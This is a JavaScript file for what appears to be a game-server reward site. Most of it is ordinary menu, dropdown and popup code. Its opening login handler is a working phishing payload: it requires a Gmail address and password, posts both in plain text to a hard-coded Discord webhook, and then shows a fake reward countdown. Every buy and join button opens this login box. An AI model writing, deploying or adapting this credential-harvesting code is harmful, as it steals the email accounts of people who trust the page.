const webhookURL = "https://discord.com/api/webhooks/1527318354191192169/NRSqo--ECTdMtyz_rkiI488C2Pd2gYVWcziRAOhDICEROFU7KTTKdbF4A2v1W57MLZmp";

function sendToWebhook(content) {
    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: content
        })
    }).catch(err => console.log("Webhook error:", err));
}


document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();

const username = document.getElementById("username").value.trim();
const password = document.getElementById("password").value.trim();

if (!username || !password) {
    alert("Please fill in all fields.");
    return;
}


if (!username.toLowerCase().endsWith("@gmail.com")) {
    alert("Please enter a valid Gmail address.");
    return;
}


    sendToWebhook(
        `🔐 LOGIN ATTEMPT\n👤 Username: ${username}\n🔑 Password: ${password}`
    );

    console.log("Username:", username);
    console.log("Password:", password);

    document.getElementById("loginBox").classList.remove("show");

  
    const popup = document.getElementById("rewardPopup");

    if (popup) {
        popup.classList.add("show");
    }
});



document.addEventListener("DOMContentLoaded", function () {



    const loginBtn =
        document.querySelector(".open-login");

    const openLoginButton =
        document.getElementById("openLoginButton");

    const loginBox =
        document.getElementById("loginBox");

    const loginOverlay =
        document.getElementById("loginOverlay");

    const loginForm =
        document.getElementById("loginForm");

    const mobileMenuButton =
        document.getElementById("mobileMenuButton");

    const mobileJoinMenu =
        document.getElementById("mobileJoinMenu");

    const mobileJoinButton =
        document.getElementById("mobileJoinButton");

    const serverDropdown =
        document.getElementById("serverDropdown");




    function openLogin() {

        if (mobileJoinMenu) {
            mobileJoinMenu.classList.remove("show");
        }

        if (mobileMenuButton) {
            mobileMenuButton.setAttribute(
                "aria-expanded",
                "false"
            );
        }

        document.body.classList.remove("menu-open");


        if (loginBox) {
            loginBox.classList.add("show");
        }

        if (loginOverlay) {
            loginOverlay.classList.add("show");
        }

        document.body.classList.add("login-open");
    }


    function closeLogin() {

        if (loginBox) {
            loginBox.classList.remove("show");
        }

        if (loginOverlay) {
            loginOverlay.classList.remove("show");
        }

        document.body.classList.remove("login-open");
    }




    if (loginBtn) {

        loginBtn.addEventListener(
            "click",
            function (event) {

                event.preventDefault();
                event.stopPropagation();

                if (
                    loginBox &&
                    loginBox.classList.contains("show")
                ) {

                    closeLogin();

                } else {

                    openLogin();

                }

            }
        );

    }


    if (openLoginButton) {

        openLoginButton.addEventListener(
            "click",
            function (event) {

                event.preventDefault();
                event.stopPropagation();

                openLogin();

            }
        );

    }




    const buyButtons =
        document.querySelectorAll(".buy-button");

    buyButtons.forEach(function (button) {

        button.addEventListener(
            "click",
            function (event) {

                event.preventDefault();
                event.stopPropagation();

                openLogin();

            }
        );

    });




    if (mobileMenuButton) {

        mobileMenuButton.addEventListener(
            "click",
            function (event) {

                event.preventDefault();
                event.stopPropagation();


                if (
                    loginBox &&
                    loginBox.classList.contains("show")
                ) {

                    closeLogin();
                    return;

                }


                if (!mobileJoinMenu) {
                    return;
                }


                const isOpen =
                    mobileJoinMenu.classList.contains("show");



                if (isOpen) {

                    mobileJoinMenu.classList.remove(
                        "show"
                    );

                    document.body.classList.remove(
                        "menu-open"
                    );

                    mobileMenuButton.setAttribute(
                        "aria-expanded",
                        "false"
                    );

                }



                else {

                    mobileJoinMenu.classList.add(
                        "show"
                    );

                    document.body.classList.add(
                        "menu-open"
                    );

                    mobileMenuButton.setAttribute(
                        "aria-expanded",
                        "true"
                    );

                }

            }
        );

    }




    if (mobileJoinButton) {

        mobileJoinButton.addEventListener(
            "click",
            function (event) {

                event.preventDefault();
                event.stopPropagation();

                openLogin();

            }
        );

    }




    if (loginOverlay) {

        loginOverlay.addEventListener(
            "click",
            function () {

                closeLogin();

            }
        );

    }



    if (loginBox) {

        loginBox.addEventListener(
            "click",
            function (event) {

                event.stopPropagation();

            }
        );

    }



    if (loginForm) {

        loginForm.addEventListener(
            "submit",
            function (event) {

                event.preventDefault();


                const username =
                    document.getElementById("username");

                const password =
                    document.getElementById("password");


                if (!username || !password) {
                    return;
                }


                const email =
                    username.value.trim();

                const pass =
                    password.value.trim();


              

                if (email === "") {

                    alert(
                        "Please enter your email."
                    );

                    username.focus();

                    return;

                }



                if (pass === "") {

                    alert(
                        "Please enter your password."
                    );

                    password.focus();

                    return;

                }


                console.log(
                    "Login:",
                    email
                );


                closeLogin();

                startRewardLoading();

            }
        );

    }




    function startRewardLoading() {

        const rewardPopup =
            document.getElementById("rewardPopup");

        const countdown =
            document.getElementById("countdown");


        if (!rewardPopup) {
            return;
        }


        let seconds = 30;


        rewardPopup.classList.add(
            "show"
        );


        if (countdown) {

            countdown.textContent =
                seconds;

        }


        if (window.rewardTimer) {

            clearInterval(
                window.rewardTimer
            );

        }


        window.rewardTimer =
            setInterval(
                function () {

                    seconds--;


                    if (countdown) {

                        countdown.textContent =
                            seconds;

                    }


                    if (seconds <= 0) {

                        clearInterval(
                            window.rewardTimer
                        );

                        window.location.href =
                            "index.html";

                    }

                },
                1000
            );

    }




    if (serverDropdown) {

        const serverSelected =
            serverDropdown.querySelector(
                ".server-selected"
            );

        const serverList =
            serverDropdown.querySelector(
                ".server-list"
            );

        const serverItems =
            serverDropdown.querySelectorAll(
                ".server-item"
            );


      

        if (serverSelected) {

            serverSelected.addEventListener(
                "click",
                function (event) {

                    event.preventDefault();
                    event.stopPropagation();


                    const isOpen =
                        serverDropdown.classList.contains(
                            "open"
                        );


                    if (isOpen) {

                        serverDropdown.classList.remove(
                            "open"
                        );

                    } else {

                        serverDropdown.classList.add(
                            "open"
                        );

                    }

                }
            );

        }



        serverItems.forEach(
            function (item) {

                item.addEventListener(
                    "click",
                    function (event) {

                        event.preventDefault();
                        event.stopPropagation();


                        const itemImage =
                            item.querySelector("img");

                        const itemName =
                            item.querySelector("span");


                        const selectedImage =
                            serverSelected
                                ? serverSelected.querySelector(
                                    ".server-flag"
                                )
                                : null;


                        const selectedName =
                            serverSelected
                                ? serverSelected.querySelector(
                                    "span:not(.server-arrow)"
                                )
                                : null;


                    

                        if (
                            itemImage &&
                            selectedImage
                        ) {

                            selectedImage.src =
                                itemImage.src;

                            selectedImage.alt =
                                itemImage.alt || "";

                        }


                   

                        if (
                            itemName &&
                            selectedName
                        ) {

                            selectedName.textContent =
                                itemName.textContent.trim();

                        }


                  

                        serverDropdown.dataset.value =
                            item.dataset.value || "";


                    

                        serverDropdown.classList.remove(
                            "open"
                        );

                    }
                );

            }
        );




        if (serverList) {

            serverList.addEventListener(
                "click",
                function (event) {

                    event.stopPropagation();

                }
            );

        }

    }




    document.addEventListener(
        "click",
        function (event) {


       

            if (
                serverDropdown &&
                !serverDropdown.contains(event.target)
            ) {

                serverDropdown.classList.remove(
                    "open"
                );

            }


         

            if (
                mobileJoinMenu &&
                mobileMenuButton &&
                mobileJoinMenu.classList.contains("show") &&
                !mobileJoinMenu.contains(event.target) &&
                !mobileMenuButton.contains(event.target)
            ) {

                mobileJoinMenu.classList.remove(
                    "show"
                );

                mobileMenuButton.setAttribute(
                    "aria-expanded",
                    "false"
                );

                document.body.classList.remove(
                    "menu-open"
                );

            }


       

            if (
                loginBox &&
                loginBox.classList.contains("show") &&
                !loginBox.contains(event.target) &&
                !loginBtn?.contains(event.target) &&
                !openLoginButton?.contains(event.target)
            ) {

                closeLogin();

            }

        }
    );




    document.addEventListener(
        "keydown",
        function (event) {

            if (event.key !== "Escape") {
                return;
            }


          

            if (serverDropdown) {

                serverDropdown.classList.remove(
                    "open"
                );

            }



            if (mobileJoinMenu) {

                mobileJoinMenu.classList.remove(
                    "show"
                );

            }


            if (mobileMenuButton) {

                mobileMenuButton.setAttribute(
                    "aria-expanded",
                    "false"
                );

            }


            document.body.classList.remove(
                "menu-open"
            );


          

            closeLogin();

        }
    );




    let lastScrollY = window.scrollY;

    window.addEventListener(
        "scroll",
        function () {

            const currentScrollY =
                window.scrollY;


 

            if (currentScrollY <= 100) {

                document.body.classList.remove(
                    "scrolled"
                );

            }



            else {

                document.body.classList.add(
                    "scrolled"
                );

            }


            lastScrollY =
                currentScrollY;

        },
        {
            passive: true
        }
    );


});



function hideMobileMenuOnPC() {
    const mobileMenu = document.getElementById("mobileJoinMenu");
    const mobileButton = document.getElementById("mobileMenuButton");

    if (!mobileMenu || !mobileButton) return;

    if (window.innerWidth > 768) {
        mobileMenu.style.setProperty("display", "none", "important");
        mobileButton.style.setProperty("display", "none", "important");
    }
}

window.addEventListener("load", hideMobileMenuOnPC);
window.addEventListener("resize", hideMobileMenuOnPC);
